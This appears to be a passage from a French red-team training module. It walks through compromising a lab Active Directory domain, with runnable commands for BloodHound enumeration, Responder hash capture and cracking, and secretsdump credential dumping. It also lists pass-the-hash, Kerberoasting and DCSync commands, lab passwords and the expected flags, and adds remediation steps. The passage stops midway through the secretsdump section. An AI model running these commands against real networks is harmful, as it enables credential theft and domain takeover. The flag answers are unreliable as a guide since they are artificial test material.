# Module 10 — Scénario Autonome : Compromission du Domaine CorpShadow

> **Jour 2 — Infrastructure & Active Directory**  
> **Durée : 60 minutes**  
> **Type : Boîte noire — Aucun compte initial fourni**  
> **Niveau : Intermédiaire / Avancé**

---

## Table des matières

1. [Briefing de mission](#1-briefing-de-mission)
2. [Règles de l'exercice (ROE)](#2-règles-de-lexercice-roe)
3. [Topologie réseau](#3-topologie-réseau)
4. [Objectifs (Flags)](#4-objectifs-flags)
5. [Solution pas à pas détaillée](#5-solution-pas-à-pas-détaillée)
   - [5.1 — Flag 1 : Énumération AD via BloodHound](#51--flag-1--énumération-ad-via-bloodhound)
   - [5.2 — Flag 2 : Capture de hash NTLMv2 via Responder + Crack](#52--flag-2--capture-de-hash-ntlmv2-via-responder--crack)
   - [5.3 — Flag 3 : Dump de hashes via secretsdump (SAM/LSASS)](#53--flag-3--dump-de-hashes-via-secretsdump-samlsass)
   - [5.4 — Flag 4 : Pass-the-Hash vers une machine distante](#54--flag-4--pass-the-hash-vers-une-machine-distante)
   - [5.5 — Flag 5 : Kerberoasting d'un compte de service](#55--flag-5--kerberoasting-dun-compte-de-service)
   - [5.6 — Flag 6 (Bonus) : DCSync → Golden Ticket → Accès persistant](#56--flag-6-bonus--dcsync--golden-ticket--accès-persistant)
6. [Workflow ATT&CK complet](#6-workflow-attck-complet)
7. [Indices](#7-indices)
8. [Template de documentation ATT&CK](#8-template-de-documentation-attck)
9. [Annexes : Corrections et explications](#9-annexes--corrections-et-explications)
10. [Références et ressources](#10-références-et-ressources)

---

## 1. Briefing de mission

### 1.1 Contexte

Vous êtes mandaté en tant que **red teamer** pour évaluer la sécurité du domaine Active Directory de la société **CorpShadow**, une PME en pleine transition numérique. CorpShadow a récemment migré son infrastructure depuis un environnement Workgroup vers un domaine Windows Server 2022, mais cette migration a été réalisée dans l'urgence, sans respect des bonnes pratiques de sécurité.

La direction de CorpShadow a accepté un test de pénétration en **boîte noire** : aucun compte privilégié, aucun accès initial, aucun détail sur la configuration interne ne vous est fourni. Vous partez d'un simple **poste utilisateur** connecté au réseau interne.

### 1.2 Objectif principal

**Compromission complète du domaine** `corp.shadow.local` — de l'accès initial au contrôleur de domaine, avec établissement d'un accès persistant.

### 1.3 Objectifs secondaires

| # | Objectif | Technique | Tags ATT&CK |
|---|----------|-----------|-------------|
| 1 | Cartographier le domaine avec BloodHound | Énumération AD | T1087.002, T1069.002 |
| 2 | Capturer un hash NTLMv2 et le casser | Responder + John/Hashcat | T1557.001, T1110.002 |
| 3 | Dumper les hashes SAM/LSASS d'une machine | secretsdump | T1003.002, T1003.001 |
| 4 | Se déplacer latéralement par Pass-the-Hash | PtH avec Impacket | T1550.002 |
| 5 | Kerberoaster un compte de service | Kerberoasting | T1558.003 |
| 6 (Bonus) | DCSync + Golden Ticket | Persistance | T1003.006, T1558.001 |

### 1.4 Scoring

| Flag | Points | Difficulté |
|------|--------|------------|
| Flag 1 | 10 pts | ★☆☆ |
| Flag 2 | 20 pts | ★★☆ |
| Flag 3 | 25 pts | ★★☆ |
| Flag 4 | 15 pts | ★☆☆ |
| Flag 5 | 20 pts | ★★★ |
| Flag 6 (Bonus) | 30 pts | ★★★ |

**Seuil de validation :** 60 pts pour valider le module.  
**Objectif avancé :** 100 pts (tous les flags, bonus inclus).

---

## 2. Règles de l'exercice (ROE)

### 2.1 Périmètre autorisé

| Élément | Valeur |
|---------|--------|
| Domaine cible | `corp.shadow.local` (10.10.10.0/24) |
| Plage d'adresses autorisée | 10.10.10.0/24 |
| Protocoles autorisés | SMB (445), RDP (3389), WinRM (5985/5986), LDAP (389/636), Kerberos (88), DNS (53) |
| Poste de départ | Workstation personnel `WS01` (10.10.10.100) — aucune restriction de droits |
| Comptes fournis | **Aucun** — découverte et escalade obligatoires |

### 2.2 Interdictions formelles

| Comportement | Sanction |
|--------------|----------|
| **DoS / DDoS** contre les serveurs de production | Exclusion immédiate |
| **Destruction ou modification** de données | Exclusion immédiate |
| **Crash du contrôleur de domaine** | Exclusion immédiate + rappel à l'ordre |
| **Déconnexion** physique ou logique des machines | Exclusion immédiate |
| **Ingénierie sociale** envers les employés non informés | Exclusion immédiate |
| **Exfiltration** de données hors du périmètre de test | Exclusion immédiate |
| **Scan réseau** hors de la plage 10.10.10.0/24 | Avertissement |

### 2.3 Conformité NIS2

Conformément à la directive **NIS2 (Network and Information Security Directive 2022/2555)**, chaque étape de l'attaque doit être :

1. **Documentée** dans le template ATT&CK fourni (section 8)
2. **Tagguée** avec la technique MITRE ATT&CK correspondante
3. **Justifiée** : pourquoi cette étape est nécessaire au test
4. **Remédiée** : proposition de correction concrète

> **Note :** Le client exige un rapport de test conforme NIS2. Les templates de documentation de la section 8 sont obligatoires pour valider l'exercice.

### 2.4 Contraintes temporelles

| Événement | Temps |
|-----------|-------|
| Début de l'exercice | T+0 min |
| Rappel intermédiaire | T+30 min |
| Fin de l'exercice | T+60 min |
| Rendu du rapport | T+75 min (15 min de marge) |

---

## 3. Topologie réseau

### 3.1 Schéma logique

```
┌─────────────────────────────────────────────────────────────────┐
│                        Réseau 10.10.10.0/24                     │
│                                                                  │
│   ┌──────────────────┐      ┌──────────────────┐                │
│   │   DC01            │      │   FS01            │               │
│   │   Contrôleur      │      │   File Server     │               │
│   │   de domaine      │      │   Windows Server  │               │
│   │   Windows 2022    │      │   Windows 2022    │               │
│   │   10.10.10.10     │      │   10.10.10.20     │               │
│   └────────┬─────────┘      └────────┬──────────┘               │
│            │                          │                          │
│            └──────────┬───────────────┘                          │
│                       │                                          │
│              ┌────────┴──────────┐                               │
│              │   WS01             │                               │
│              │   Workstation      │                               │
│              │   Windows 11       │                               │
│              │   10.10.10.100     │                               │
│              │   ★ POSTE DE       │                               │
│              │     DÉPART         │                               │
│              └───────────────────┘                               │
│                                                                  │
│   ┌─────────────────────────────────────────────┐                │
│   │   Kali Attacker (VM)                         │               │
│   │   10.10.10.200                                │               │
│   │   ★ POSTE DE L'OPÉRATEUR                     │               │
│   └─────────────────────────────────────────────┘                │
└─────────────────────────────────────────────────────────────────┘
```

### 3.2 Machines et rôles

| Nom | IP | Rôle | OS | Services exposés |
|-----|----|------|----|------------------|
| **DC01** | 10.10.10.10 | Contrôleur de domaine (DNS, LDAP, Kerberos, SMB) | Windows Server 2022 | 53, 88, 135, 139, 389, 445, 636, 3268, 5985, 5986, 9389 |
| **FS01** | 10.10.10.20 | File server (partage SMB) | Windows Server 2022 | 135, 139, 445, 5985, 5986 |
| **WS01** | 10.10.10.100 | Workstation (poste utilisateur) — **point de départ** | Windows 11 Pro | 135, 139, 445, 3389, 5985 |
| **Kali** | 10.10.10.200 | Attaquant (Kali Linux) | Kali Linux 2025.x | — |

### 3.3 Comptes et permissions

> **Rappel : boîte noire — ces informations ne sont PAS connues au départ.**
> Elles sont fournies ici à titre informatif pour le correcteur.

| Nom d'utilisateur | Rôle | Machines accessibles | Mots de passe / Hash |
|-------------------|------|---------------------|----------------------|
| `CORPSHADOW\Administrator` | Admin du domaine | DC01, FS01, WS01 | — |
| `CORPSHADOW\jdoe` | Utilisateur standard | WS01 | `P@ssw0rd!2025` (flag 2) |
| `CORPSHADOW\svc_backup` | Compte de service (Kerberoastable) | FS01 | `SvcB@ckup#2025` (flag 5) |
| `CORPSHADOW\svc_sql` | Compte de service SQL | DC01 | `SQL_Svc!2025` |
| `CORPSHADOW\krbtgt` | Compte KRBTGT (Golden Ticket) | DC01 | — |

### 3.4 Vulnérabilités simulées

| Vulnérabilité | Machine | Impact |
|---------------|---------|--------|
| Réponse LLMNR/mDNS active | WS01 | Capture de hash via Responder (Flag 2) |
| Partage SMB avec accès invité ou anonyme | FS01 | Accès non autorisé aux fichiers |
| Compte de service avec SPN et mot de passe faible | DC01 | Kerberoasting (Flag 5) |
| Pas de LAPS — même admin local sur toutes les machines | WS01, FS01 | Reuse de hash (Flag 4) |
| Délégation non contrainte sur un serveur | FS01 | Délégation (utilisé en bonus) |
| Aucune protection AS-REP Roasting | — | Faiblesse Kerberos |

---

## 4. Objectifs (Flags)

### 4.1 Récapitulatif des flags

| Flag | Nom | Commande clé | Fichier/output attendu |
|------|-----|--------------|------------------------|
| **Flag 1** | BloodHound — Énumération AD | `bloodhound-python -d corp.shadow.local -ns 10.10.10.10 -c all` | `/tmp/bloodhound/` contenant les fichiers JSON |
| **Flag 2** | Responder — Capture NTLMv2 | `responder -I eth0 -rdwv` | Hash NTLMv2 dans `/usr/share/responder/logs/` |
| **Flag 3** | secretsdump — SAM/LSASS | `impacket-secretsdump CORPSHADOW/jdoe:P@ssw0rd!2025@10.10.10.20` | Champs `hashes` des utilisateurs locaux et domaine |
| **Flag 4** | Pass-the-Hash — wmiexec | `impacket-wmiexec -hashes :<NT_HASH> CORPSHADOW/jdoe@10.10.10.20` | Shell administratif sur une machine distante |
| **Flag 5** | Kerberoasting — TGS-REP | `impacket-GetUserSPNs CORPSHADOW/jdoe:P@ssw0rd!2025 -dc-ip 10.10.10.10 -request` | Ticket TGS cracké = mot de passe du service |
| **Flag 6 (Bonus)** | DCSync → Golden Ticket | `impacket-secretsdump CORPSHADOW/Administrator@10.10.10.10 -just-dc` | Hash KRBTGT + création Golden Ticket |

### 4.2 Format des flags

Chaque flag est une chaîne de caractères au format :

```
FLAG{Module10_<technique>_<hash_partiel>}
```

Exemple : `FLAG{Module10_bloodhound_3f7a2b1c}`

Les flags sont stockés dans :
- **Flag 1** : Fichier texte `C:\Flags\flag1.txt` sur WS01
- **Flag 2** : Fichier texte `C:\Flags\flag2.txt` sur WS01
- **Flag 3** : Fichier texte `C:\Flags\flag3.txt` sur FS01
- **Flag 4** : Fichier texte `C:\Flags\flag4.txt` sur FS01
- **Flag 5** : Fichier texte `C:\Flags\flag5.txt` sur DC01
- **Flag 6 (Bonus)** : Fichier texte `C:\Flags\flag6.txt` sur DC01

---

## 5. Solution pas à pas détaillée

### 5.1 — Flag 1 : Énumération AD via BloodHound

#### 5.1.1 Technique et ATT&CK

| Propriété | Valeur |
|-----------|--------|
| **Technique** | Énumération des groupes de domaine (Domain Groups) |
| **Sous-technique** | T1069.002 — Permission Groups Discovery: Domain Groups |
| **Tactique** | TA0007 — Discovery |
| **Outil** | `bloodhound-python` (Ingestor BloodHound pour Linux) |
| **Prérequis** | Aucun — utilisable sans authentification en mode anonyme (selon config) |

#### 5.1.2 Explication détaillée

BloodHound est un outil de cartographie des relations Active Directory. Il utilise le protocole **LDAP (Lightweight Directory Access Protocol)** pour interroger l'annuaire du domaine et collecter les informations suivantes :

- Utilisateurs, groupes, ordinateurs
- Appartenances aux groupes
- Sessions actives
- ACL (Access Control Lists) et permissions
- Relations de confiance
- Chemins d'attaque possibles

L'ingestor `bloodhound-python` se connecte au contrôleur de domaine via LDAP (port 389/TCP) et collecte ces données pour les exporter au format JSON, qui peuvent ensuite être importées dans l'interface graphique BloodHound (Neo4j + Electron).

> **Pourquoi ça marche ?**  
> Par défaut, Active Directory autorise les requêtes LDAP anonymes ou non authentifiées pour les informations de base (utilisateurs, groupes, ordinateurs). Même sans compte valide, il est souvent possible de récupérer la liste complète des objets du domaine. Sur certaines configurations mal durcies, l'accès LDAP anonyme est encore activé.

#### 5.1.3 Commande

```bash
# Syntaxe complète de la commande bloodhound-python
# bloodhound-python est l'ingestor (collecteur) de données pour BloodHound
# Il se connecte au contrôleur de domaine via LDAP (port 389) pour interroger l'annuaire
bloodhound-python \
    -d corp.shadow.local \
    -ns 10.10.10.10 \
    -c all \
    -o /tmp/bloodhound_output
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `bloodhound-python` | Ingestor BloodHound pour Linux ; collecte les données AD (utilisateurs, groupes, ordinateurs, ACL, sessions) via LDAP et les exporte au format JSON |
| `-d corp.shadow.local` | **Domain** : spécifie le nom de domaine Active Directory cible |
| `-ns 10.10.10.10` | **Name Server** : adresse IP du serveur DNS (ici le contrôleur de domaine DC01) utilisé pour résoudre les noms du domaine |
| `-c all` | **Collection** : collecte tous les types de données disponibles (groupes, sessions, ACL, trusts, utilisateurs, ordinateurs, etc.) |
| `-o /tmp/bloodhound_output` | **Output** : répertoire de destination pour les fichiers JSON générés |

**Variante si l'accès anonyme est désactivé (nécessite un compte) :**

```bash
# Avec authentification (une fois le flag 2 obtenu)
# On utilise les identifiants de jdoe récupérés via le crack du hash NTLMv2
bloodhound-python \
    -d corp.shadow.local \
    -ns 10.10.10.10 \
    -c all \
    -u jdoe \
    -p 'P@ssw0rd!2025' \
    -o /tmp/bloodhound_output
```

**Explication des options supplémentaires :**

| Option | Rôle/Explication |
|--------|------------------|
| `-u jdoe` | **Username** : nom d'utilisateur du domaine pour s'authentifier auprès du contrôleur de domaine |
| `-p 'P@ssw0rd!2025'` | **Password** : mot de passe en clair de l'utilisateur (obtenu après crack du hash NTLMv2 au flag 2) |

#### 5.1.4 Exécution

```bash
# Étape 1 : Créer le répertoire de sortie
# mkdir -p crée le dossier et ses parents si nécessaire (option -p = parents)
# On stocke les fichiers JSON dans /tmp pour éviter de polluer le système de fichiers
mkdir -p /tmp/bloodhound_output

# Étape 2 : Lancer l'ingestor BloodHound
# bloodhound-python se connecte au DC via LDAP pour collecter la topologie AD
# Les données sont exportées en JSON pour analyse dans l'interface BloodHound
bloodhound-python \
    -d corp.shadow.local \
    -ns 10.10.10.10 \
    -c all \
    -o /tmp/bloodhound_output

# Étape 3 : Vérifier les fichiers générés
# ls -la liste les fichiers avec leurs permissions, propriétaire, taille et date
ls -la /tmp/bloodhound_output/
# Output attendu : 4 fichiers JSON contenant les objets AD collectés
#   - 20250530_*****_users.json      → Liste de tous les utilisateurs du domaine
#   - 20250530_*****_groups.json     → Liste de tous les groupes (Domain Admins, etc.)
#   - 20250530_*****_computers.json  → Liste de toutes les machines du domaine
#   - 20250530_*****_acls.json       → Permissions ACL entre les objets AD
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `mkdir -p /tmp/bloodhound_output` | Crée le dossier de sortie ; `-p` évite une erreur si le dossier existe déjà et crée les parents manquants |
| `bloodhound-python ...` | Ingestor BloodHound : collecte les données AD via LDAP et les exporte en JSON |
| `ls -la /tmp/bloodhound_output/` | Liste le contenu du dossier ; `-l` = format long (permissions, taille, date), `-a` = fichiers cachés inclus |

#### 5.1.5 Import dans BloodHound (interface graphique)

```bash
# === INSTALLATION DE BLOODHOUND (première fois uniquement) ===
sudo apt install -y neo4j bloodhound
sudo neo4j start
# Au premier lancement, Neo4j demande de changer le mot de passe.
# Navigateur → http://localhost:7474 → login: neo4j / password: neo4j
# Définir un nouveau mot de passe (ex: bloodhound) puis lancer BloodHound :
bloodhound &
```

```bash
# Lancer Neo4j (base de données graphique)
# Neo4j est le moteur de base de données qui stocke les relations entre objets AD
# sudo est nécessaire car Neo4j écoute sur des ports privilégiés (7687, 7474)
sudo neo4j start

# Lancer BloodHound (interface graphique Electron)
# Le '&' place le processus en arrière-plan pour libérer le terminal
# BloodHound se connecte à Neo4j et permet de visualiser les chemins d'attaque
bloodhound &
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `sudo neo4j start` | Démarre le service Neo4j (base de données graphe) ; `sudo` requis pour les droits d'administration système |
| `bloodhound &` | Lance l'interface BloodHound (Electron) en arrière-plan avec `&` pour libérer le terminal |

```text
Dans BloodHound :
1. Cliquer sur "Upload Data" → Importer les fichiers JSON collectés
2. Sélectionner tous les fichiers .json dans /tmp/bloodhound_output/
3. Analyser les chemins d'attaque : BloodHound calcule les relations
   (membres de groupes, sessions, ACL, etc.) et propose des chemins
   pour atteindre des privilèges élevés
```

#### 5.1.6 Flag attendu

```text
FLAG{Module10_bloodhound_a1b2c3d4}
```

#### 5.1.7 Analyse post-exercice — Remédiation

```powershell
# Désactiver l'accès LDAP anonyme (à exécuter sur le contrôleur de domaine DC01)
# Set-ItemProperty modifie une valeur dans le registre Windows
# Le chemin HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters pointe vers
# la configuration du service NTDS (Active Directory Domain Services)
# LDAPServerIntegrity = 2 force l'intégrité LDAP et bloque les requêtes anonymes
Set-ItemProperty `
    -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" `
    -Name "LDAPServerIntegrity" `
    -Value 2

# Vérifier la clé de registre : Get-ItemProperty lit la valeur pour confirmer
# qu'elle a bien été modifiée (vérification post-exploitation)
Get-ItemProperty `
    -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" `
    -Name "LDAPServerIntegrity"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `Set-ItemProperty` | Modifie une propriété dans le registre Windows (équivalent PowerShell de `regedit`) |
| `-Path "HKLM:\...\NTDS\Parameters"` | Chemin de la ruche registre contenant la configuration du service Active Directory (NTDS) |
| `-Name "LDAPServerIntegrity"` | Nom de la valeur registre qui contrôle l'intégrité des requêtes LDAP |
| `-Value 2` | Valeur 2 = activer l'intégrité LDAP (bloque les requêtes anonymes) |
| `Get-ItemProperty` | Lit une valeur du registre pour vérification |

---

### 5.2 — Flag 2 : Capture de hash NTLMv2 via Responder + Crack

#### 5.2.1 Technique et ATT&CK

| Propriété | Valeur |
|-----------|--------|
| **Technique** | LLMNR/NBT-NS Poisoning and Relay |
| **Sous-technique** | T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay |
| **Tactique** | TA0006 — Credential Access |
| **Outil** | `Responder` (toolkit) + `john` ou `hashcat` |
| **Prérequis** | Être sur le même réseau que WS01 ; LLMNR activé sur le poste |

#### 5.2.2 Explication détaillée

**LLMNR (Link-Local Multicast Name Resolution)** est un protocole de résolution de noms qui fonctionne sur le port UDP 5355. Lorsqu'un nom d'hôte n'est pas résolu par DNS, Windows émet une requête LLMNR multicast sur le réseau local.

**Responder** est un empoisonneur LLMNR/NBT-NS/mDNS qui écoute sur le réseau et répond aux requêtes de résolution de noms. Quand une machine cliente tente de résoudre un nom qui n'existe pas (ou si le DNS est temporairement indisponible), Responder répond en usurpant l'identité de la cible. Le client envoie alors ses identifiants NTLMv2 pour s'authentifier, et Responder capture le hash.

> **Scénario typique :** Un utilisateur tape accidentellement `\\serveur_fichier` au lieu de `\\serveur_fichiers` (faute de frappe) dans l'explorateur Windows. LLMNR tente de résoudre le nom, Responder répond, et le hash NTLMv2 de l'utilisateur est capturé.

**Le hash NTLMv2** est un challenge-réponse qui contient :
- Le nom d'utilisateur
- Le nom de domaine
- Le challenge (valeur aléatoire)
- La réponse HMAC-MD5 (preuve de connaissance du mot de passe)

Ce hash peut être **cracké hors ligne** (offline) avec des outils comme `john` ou `hashcat` pour retrouver le mot de passe en clair.

#### 5.2.3 Commande

```bash
# Étape 1 : Lancer Responder en mode empoisonnement
# sudo = exécution avec privilèges root (nécessaire pour le sniffing réseau)
# responder écoute sur l'interface réseau et empoisonne les requêtes LLMNR/NBT-NS/mDNS
# Quand une machine tente de résoudre un nom inexistant, Responder usurpe l'identité
# et capture le hash NTLMv2 envoyé par le client pour s'authentifier
# Ou remplacer par votre interface (ip addr show pour lister)
sudo responder -I $(ip route get 1.1.1.1 | awk '{print $5; exit}') -rdwv
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `sudo` | Élévation de privilèges root (nécessaire pour la capture de paquets réseau brut) |
| `responder` | Outil d'empoisonnement LLMNR/NBT-NS/mDNS qui capture les hashes NTLMv2 |
| `-I eth0` | **Interface** : nom de l'interface réseau à écouter (eth0 est l'interface Ethernet principale sur Kali) |
| `-r` | **Respond NBT-NS** : répondre aux requêtes NetBIOS Name Service (port UDP 137) |
| `-d` | **DHCP** : activer le mode DHCP pour répondre aux requêtes de configuration réseau |
| `-w` | **WPAD** : répondre aux requêtes Web Proxy Auto-Discovery (forcer le trafic HTTP à passer par l'attaquant) |
| `-v` | **Verbose** : mode verbeux ; affiche chaque requête reçue en temps réel dans le terminal |

**Simulation côté utilisateur (sur WS01 via PowerShell) :**

```powershell
# L'utilisateur fait une faute de frappe dans un chemin UNC (Universal Naming Convention)
# Au lieu de taper le bon nom de serveur, il tape un nom qui n'existe pas
# Windows tente d'abord une résolution DNS, puis LLMNR (multicast)
# Responder, qui écoute le réseau, répond à la requête LLMNR en usurpant l'identité
net use \\FAUX_SERVEUR\partage
```

**Explication :**

| Commande | Rôle/Explication |
|----------|------------------|
| `net use \\FAUX_SERVEUR\partage` | Mappe un lecteur réseau sur un chemin UNC inexistant ; déclenche une résolution de nom LLMNR que Responder va empoisonner |

#### 5.2.4 Capture du hash

```bash
# Responder affichera un résultat similaire dans le terminal :
# [SMB]     → Le protocole utilisé pour la capture (SMB : Server Message Block)
# NTLMv2-SSP → Type de hash capturé (NTLMv2 avec Security Support Provider)
# from 10.10.10.100 → Adresse IP de la machine victime (WS01)
# Username : CORPSHADOW\jdoe → Nom d'utilisateur complet (domaine\nom)
# Hash :      → Le hash NTLMv2 complet au format challenge-réponse
# Structure du hash : utilisateur::domaine:challenge:response:HMAC-MD5
#   - jdoe            : nom d'utilisateur
#   - CORPSHADOW      : nom du domaine
#   - 1122334455667788 : challenge NTLM (8 octets hexadécimaux)
#   - 0123456789...   : preuve HMAC-MD5 (prouve la connaissance du mot de passe)

# Les logs sont sauvegardés automatiquement par Responder
# Le dossier /usr/share/responder/logs/ contient tous les hashes capturés
# Utile pour analyse ultérieure ou pour cracker après la session
ls -la /usr/share/responder/logs/
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `ls -la /usr/share/responder/logs/` | Liste les fichiers de log de Responder ; `-l` = format détaillé, `-a` = fichiers cachés ; les hashes capturés y sont stockés avec horodatage |

#### 5.2.5 Crack du hash

```bash
# Étape 1 : Copier le hash NTLMv2 dans un fichier texte pour le crack
# echo affiche la chaîne entre quotes et > redirige la sortie vers un fichier
# Le hash NTLMv2 est stocké dans /tmp/ntlmv2_hash.txt pour traitement par john
echo 'jdoe::CORPSHADOW:1122334455667788:0123456789abcdef0123456789abcdef:0101000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000' > /tmp/ntlmv2_hash.txt

# Étape 2 : Cracker le hash avec john (John the Ripper) en mode wordlist
# Décompresser rockyou.txt si nécessaire (Kali uniquement)
sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true
# --wordlist spécifie le dictionnaire à utiliser (rockyou.txt = liste de mots de passe courants)
# john essaie chaque mot du dictionnaire en calculant le hash correspondant
# et le compare au hash capturé (attaque par dictionnaire)
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/ntlmv2_hash.txt

# Étape 3 : Afficher le résultat du crack
# --show affiche les mots de passe trouvés pour les hashes du fichier
# Format de sortie : utilisateur:mot_de_passe:domaine:challenge:response
john --show /tmp/ntlmv2_hash.txt
# Output attendu :
# jdoe:P@ssw0rd!2025:CORPSHADOW:1122334455667788:0123456789abcdef...
# 1 password hash cracked, 0 left
# → Le mot de passe de jdoe est P@ssw0rd!2025

# Alternative avec hashcat (plus rapide si GPU disponible)
# -m 5600 : mode hash = NetNTLMv2 (format spécifique pour NTLMv2)
# --force : ignorer les avertissements de compatibilité GPU/OpenCL
hashcat -m 5600 /tmp/ntlmv2_hash.txt /usr/share/wordlists/rockyou.txt --force
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `echo '...' > /tmp/ntlmv2_hash.txt` | Écrit le hash NTLMv2 dans un fichier ; `>` redirige la sortie (écrase si fichier existe) |
| `john --wordlist=... /tmp/ntlmv2_hash.txt` | **John the Ripper** : craqueur de mots de passe ; `--wordlist` = chemin du dictionnaire (`rockyou.txt` contient ~14 millions de mots de passe courants) |
| `john --show /tmp/ntlmv2_hash.txt` | Affiche les mots de passe déjà crackés pour les hashes du fichier spécifié |
| `hashcat -m 5600 ... --force` | **Hashcat** : craqueur GPU-accéléré ; `-m 5600` = mode NetNTLMv2 ; `--force` = ignorer les avertissements |

#### 5.2.6 Flag attendu

```text
FLAG{Module10_responder_e5f6g7h8}
```

#### 5.2.7 Analyse post-exercice — Remédiation

```powershell
# Désactiver LLMNR via GPO (recommandé - mesure de sécurité critique)
# LLMNR (Link-Local Multicast Name Resolution) est un protocole de secours
# pour la résolution de noms. Il n'est pas nécessaire dans un domaine AD
# disposant d'un DNS fonctionnel. Sa désactivation empêche l'empoisonnement.

# Équivalent PowerShell (modification directe du registre local) :
# Set-ItemProperty modifie la valeur EnableMulticast dans la clé DNSClient
# EnableMulticast = 0 désactive complètement LLMNR sur la machine
# Le chemin HKLM:\SOFTWARE\Policies\Microsoft... correspond à la GPO locale
Set-ItemProperty `
    -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" `
    -Name "EnableMulticast" `
    -Value 0

# Disable-WindowsOptionalFeature désactive une fonctionnalité Windows optionnelle
# -Online = agit sur le système en cours d'exécution (pas une image offline)
# -FeatureName smb1protocol = SMBv1 (obsolète, dangereux, jamais nécessaire)
Disable-WindowsOptionalFeature -Online -FeatureName smb1protocol

# Activer SMB Signing pour prévenir les attaques de relay NTLM
# RequireSecuritySignature = 1 force la signature SMB (empêche la modification
# des paquets SMB en transit et bloque les attaques de type SMB Relay)
Set-ItemProperty `
    -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" `
    -Name "RequireSecuritySignature" `
    -Value 1
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `Set-ItemProperty -Path HKLM:\... -Name EnableMulticast -Value 0` | Désactive LLMNR dans le registre (0 = désactivé) ; `HKLM` = HKEY_LOCAL_MACHINE |
| `HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient` | Chemin registre de la politique DNS ; les clés sous `Policies` écrasent les valeurs par défaut |
| `EnableMulticast` | Valeur registre qui contrôle LLMNR ; 0 = désactivé, 1 = activé |
| `Disable-WindowsOptionalFeature -Online -FeatureName smb1protocol` | Désinstalle SMBv1 (protocole obsolète et non sécurisé) ; `-Online` = système actif |
| `Set-ItemProperty ... RequireSecuritySignature -Value 1` | Active la signature SMB obligatoire (empêche le relay et le tamisage des paquets SMB) |

---

### 5.3 — Flag 3 : Dump de hashes via secretsdump (SAM/LSASS)

#### 5.3.1 Technique et ATT&CK

| Propriété | Valeur |
|-----------|--------|
| **Technique** | OS Credential Dumping |
| **Sous-technique** | T1003.002 — Security Account Manager (SAM) |
| **Tactique** | TA0006 — Credential Access |
| **Outil** | `impacket-secretsdump` |
| **Prérequis** | Mot de passe de `jdoe` (flag 2) ; accès SMB vers FS01 |

#### 5.3.2 Explication détaillée

`secretsdump` fait partie de la suite **Impacket** et permet d'extraire les hashes de mots de passe d'une machine Windows distante en utilisant le protocole SMB. Il implémente plusieurs techniques :

1. **Extraction SAM (Security Account Manager)** : La base SAM contient les hashes des comptes locaux de la machine. Elle est stockée dans `C:\Windows\System32\config\SAM` et est chiffrée avec la clé `syskey` (stockée dans le registre SYSTEM). Secretsdump extrait à la fois SAM et SYSTEM pour déchiffrer les hashes.

2. **Extraction du cache de domaine** : Le cache `NL$KM` stocke les hashes des derniers utilisateurs du domaine qui se sont connectés à la machine. Utile pour récupérer des hashes de comptes du domaine.

3. **Extraction LSASS (via DCSync)** : En mode `-just-dc`, secretsdump utilise la réplication Active Directory (DRS) pour extraire tous les hashes du domaine — nous verrons cela dans le flag 6.

> **Pourquoi ça marche ?**  
> Avec des identifiants valides (même non-admin), secretsdump peut accéder au partage ADMIN$ (C$ via SMB) et lire les fichiers de registre (SAM, SYSTEM, SECURITY) à distance via la ruche de registre. Ces ruches sont déchiffrées localement pour extraire les hashes.  
> **Contre-mesure :** L'UAC distant (Remote UAC) bloque les comptes non-admin pour l'accès aux ruches de registre. Cependant, sur les serveurs Windows 2022 sans configuration spécifique, un compte utilisateur standard peut parfois encore accéder à certaines informations.

#### 5.3.3 Commande

```bash
# Syntaxe de base de la commande impacket-secretsdump
# impacket-secretsdump fait partie de la suite Impacket (bibliothèque Python)
# Il se connecte à la machine cible via SMB (port 445) et extrait les hashes
# depuis les ruches de registre (SAM, SYSTEM, SECURITY) à distance
impacket-secretsdump \
    CORPSHADOW/jdoe:'P@ssw0rd!2025'@10.10.10.20
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `impacket-secretsdump` | Outil Impacket d'extraction de hashes à distance via SMB/registre ; implémente le dump SAM/LSA/DC |
| `CORPSHADOW/jdoe` | Compte de domaine au format `DOMAINE/utilisateur` pour l'authentification SMB |
| `:'P@ssw0rd!2025'` | Mot de passe en clair (obtenu au flag 2) ; les guillemets simples évitent l'interprétation des caractères spéciaux par le shell |
| `@10.10.10.20` | Adresse IP de la cible (FS01 — le serveur de fichiers) ; le `@` sépare les identifiants de la cible |

**Variantes utiles :**

```bash
# Extraction complète (SAM + LSA + cache domaine)
# Par défaut, secretsdump extrait :
#   - SAM (comptes locaux)
#   - SYSTEM (clé de déchiffrement du SAM)
#   - SECURITY (cache du domaine LSA)
impacket-secretsdump \
    CORPSHADOW/jdoe:'P@ssw0rd!2025'@10.10.10.20

# Extraction uniquement du SAM (Security Account Manager)
# -sam limite l'extraction à la base SAM (comptes locaux uniquement)
# Utile pour cibler uniquement les comptes locaux sans les données LSA
impacket-secretsdump \
    CORPSHADOW/jdoe:'P@ssw0rd!2025'@10.10.10.20 \
    -sam

